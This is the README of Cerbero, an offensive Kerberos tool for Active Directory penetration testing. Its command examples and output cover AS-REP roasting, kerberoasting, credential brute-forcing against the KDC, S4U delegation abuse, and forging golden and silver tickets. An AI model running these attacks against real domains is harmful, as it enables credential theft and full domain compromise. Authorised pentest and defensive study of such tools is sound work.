<!-- cargo-sync-readme start -->

# Cerbero

Kerberos protocol attacker. Tool to perform several tasks
related with Kerberos protocol in an Active Directory pentest.

## Installation

From crates:
```sh
cargo install cerbero
```

From repo:
```sh
git clone https://gitlab.com/Zer1t0/cerbero.git
cd cerbero/
cargo install --path .
```

## Commands
- [ask](#ask)
- [asreproast](#asreproast)
- [brute](#brute)
- [convert](#convert)
- [craft](#craft)
- [hash](#hash)
- [kerberoast](#kerberoast)
- [list](#list)

### Ask
The `ask` command allows to retrieve Kerberos tickets (TGT/TGS) from the KDC
(Domain Controller in Active Directory environment). Moreover also
perform requests to obtain tickets by using the S4U2Self and S4U2Proxy
Kerberos extensions.

Ask TGT:
```shell
$ cerbero ask -u under.world/Hades -p 'IamtheKingofD34d!!' -vv
INFO - Request TGT for Hades
INFO - Save Hades TGT in Hades.ccache
```

Ask TGS:
```shell
$ cerbero ask -u under.world/Hades -p 'IamtheKingofD34d!!' -s ldap/under.world -vv
WARN - No TGT found in Hades.ccache: Unable to read the file 'Hades.ccache': No such file or directory (os error 2)
INFO - Request TGT for Hades
INFO - Request ldap/dc01 TGS for Hades
INFO - Save Hades TGS for ldap/dc01 in Hades.ccache
```

Perform S4u2self:
```shell
$ cerbero ask -u under.world/Hades -p 'IamtheKingofD34d!!' -i Zeus
WARN - No TGT found in Hades.ccache: Unable to read the file 'Hades.ccache': No such file or directory (os error 2)
INFO - Request TGT for Hades
INFO - Request Zeus S4U2Self TGS for Hades
INFO - Save Zeus S4U2Self TGS for Hades in Hades.ccache
```

Perform S4u2proxy:
```shell
$ cerbero ask -u under.world/Hades -p 'IamtheKingofD34d!!' -i Zeus -s ldap/under.world -vv
WARN - No TGT found in Hades.ccache: Unable to read the file 'Hades.ccache': No such file or directory (os error 2)
INFO - Request TGT for Hades
WARN - No Zeus S4U2Self TGS for Hades found
INFO - Request Zeus S4U2Self TGS for Hades
INFO - Request ldap/under.world S4U2Proxy TGS for Zeus
INFO - Save Zeus S4U2Proxy TGS for ldap/under.world in Hades.ccache
```


### AsRepRoast
`asreproast` can be used to discover users that do not require
pre-authentication and retrieve a ticket to crack with hashcat or john.

Check many users:
```shell
cerbero asreproast under.world users.txt
```

Check many users with weak RC4 cipher (easier to crack):
```shell
cerbero asreproast under.world users.txt --cipher rc4
```

### Brute
`brute` performs TGTs requests in order to discover user credentials
based on the KDC response. This bruteforce technique allows you to
discover:
+ Valid username/password pairs
+ Valid usernames
+ Expired passwords
+ Blocked or disabled users

This attack should be performed carefully since can block user
accounts in case of perform many incorrect authentication attemps
for the same user.

Test many users and passwords:
```shell
cerbero brute under.world users.txt passwords.txt
```

Test one user and many passwords:
```shell
cerbero brute under.world Zeus passwords.txt
```

Test many users and one password:
```shell
cerbero brute under.world users.txt Olympus1234
```

Test one user and one password:
```shell
cerbero brute under.world Zeus Olympus1234
```

### Convert
`convert` ticket files between krb (Windows) and
ccache (Linux) formats.

Convert ccache to krb:
```shell
cerbero convert hades.ccache hades.krb
```

Convert krb to ccache:
```shell
cerbero convert hades.krb hades.ccache
```
### Craft
To `craft` golden and silver tickets.

Craft a golden ticket (by using the `krbtgt` AES256 key):
```shell
$ cerbero craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --aes fed0c966ff7f88d776bb35fed0f039725f8bbb87017d5b6b76ee848f25562d2c -vv
INFO - Save kratos TGT in kratos.ccache
```

Craft a silver ticket (for the service `cifs` hosted by the machine `styx`):
```shell
$ cerbero craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --ntlm 29f9ab984728cc7d18c8497c9ee76c77 -s cifs/styx,under.world -vv
INFO - Save kratos TGS for cifs/styx.under.world in kratos.ccache
```

### Hash
Calculate the Kerberos keys (password hashes) from the user password.

Calculate RC4 key (NT hash):
```shell
$ cerbero hash 'IamtheKingofD34d!!'
rc4:86e0a04f7a44ed4d4a7eaf2ee977c799
```

Calculate all the keys:
```shell
$ cerbero hash 'IamtheKingofD34d!!' -u under.world/Hades
rc4:86e0a04f7a44ed4d4a7eaf2ee977c799
aes128:fe165dec904772a90a177069e4ea7019
aes256:1304965c35176aeb72e1ae5fdd6c2fe2e901af7223cb75f5eaac25ad667136e7
```

### Kerberoast
To format encrypted part of tickets in order to be cracked by hashcat or john.

```shell
$ cerbero kerberoast -s services.txt -u under.world/Hades -p IamtheKingofD34d!!
```
To get a list of services you could use `ldapsearch`:
```shell
ldapsearch -b "dc=under,dc=world" -w IamtheKingofD34d!! -D "Hades@under.world" "(&(samAccountType=805306368)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" servicePrincipalName | grep servicePrincipalName: | cut -d ' ' -f 2 | tee services.txt
```

### List
`list` shows the tickets information of a credentials file. Similar
to `klist` command.

```shell
$ cerbero list hades.ccache -fe
Ticket cache (ccache): FILE:hades.ccache

Hades@UNDER.WORLD => krbtgt/UNDER.WORLD@UNDER.WORLD
Valid starting: 12/22/2020 17:39:34
Expires : 12/23/2020 03:39:34
Renew until: 12/29/2020 17:39:34
Flags: FRIA
Etype (skey, tkt): aes256-cts-hmac-sha1-96 (18), aes256-cts-hmac-sha1-96 (18)
```

## Credits
This work is based on great work of other people:
- [Impacket](https://github.com/SecureAuthCorp/impacket) of Alberto Solino [@agsolino](https://github.com/agsolino)
- [Rubeus](https://github.com/GhostPack/Rubeus) of Will [@harmj0y](https://twitter.com/harmj0y) and Elad Shamir [@elad_shamir](https://twitter.com/elad_shamir)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) of [@gentilkiwi](https://twitter.com/gentilkiwi)

<!-- cargo-sync-readme end -->
